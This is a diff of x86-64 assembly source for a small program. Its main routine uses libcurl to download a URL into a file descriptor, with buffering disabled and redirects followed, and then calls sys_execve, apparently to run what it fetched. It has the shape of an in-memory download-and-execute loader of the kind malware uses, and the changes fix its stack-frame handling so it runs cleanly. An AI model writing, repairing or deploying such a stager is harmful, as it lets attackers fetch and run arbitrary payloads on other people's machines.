@@ -24,14 +24,12 @@ global main
 
 main: 
     push rbp
-    mov  rdi, CURL_GLOBAL_ALL 
-    xor  eax, eax              
+    mov rbp, rsp
+    mov rdi, CURL_GLOBAL_ALL 
+    xor eax, eax              
     call curl_global_init
-    pop  rbp
 
-    push rbp
     call curl_easy_init
-    pop rbp
 
     cmp  rax, 0
     je   error
@@ -45,85 +43,67 @@ main:
 
     add [pfd+14], rax
 
-    push rbp
     mov  rdi, rax
     mov  rsi, md
     xor  rax, rax
     call fdopen                                 
-    pop  rbp
 
     mov [filea], rax
 
-    push rbp 
     mov  rdi, rax 
     mov  rsi, 0
     mov  rdx, _IONBF                            ; disable buffering
     mov  rcx, 0                                 ; else we get only first 4096 
     call setvbuf                                ; bytes 
-    pop  rbp
 
-    push rbp
     mov rdx, [filea]
     mov rdi, [curly]
     mov rsi, CURLOPT_WRITEDATA
     xor rax, rax
     call curl_easy_setopt
-    pop rbp
 
     cmp rax, 0
     jne error 
  
-    push rbp
     mov rdi, [curly]
     mov rsi, CURLOPT_URL               
     mov rdx, url
     xor rax, rax
     call curl_easy_setopt
-    pop rbp    
 
     cmp rax, 0
     jne error
 
-    push rbp
     mov rdi, [curly]
     mov rsi, CURLOPT_USERAGENT
     mov rdx, ua
     xor eax, eax
     call curl_easy_setopt
-    pop rbp
 
     cmp rax, 0
     jne error
 
-    push rbp
     mov rdi, [curly]
     mov rsi, CURLOPT_FOLLOWLOCATION
     mov rdx, 1
     xor eax, eax
     call curl_easy_setopt
-    pop rbp
 
     cmp rax, 0
     jne error
 
-    push rbp
     mov rdi, [curly]
     xor eax, eax 
     call curl_easy_perform
-    pop rbp 
 
     cmp rax, 0
     jne error
 
-    push rbp 
     mov rdi, [curly]
     xor eax, eax
     call curl_easy_cleanup
-    pop rbp
 
-    push rbp
     call curl_global_cleanup
-    pop rbp
 
     mov rbp, rsp
     mov rax, 59                               ;  sys_execve
@@ -132,10 +112,14 @@ main:
     mov rdx, 0
     syscall 
 
+    mov rsp, rbp
+    pop rbp
     xor eax, eax                              ; shouldn't get here 
     ret 
 
 error:
+    mov rsp, rbp
+    pop rbp
     mov rax, 1
     ret
 
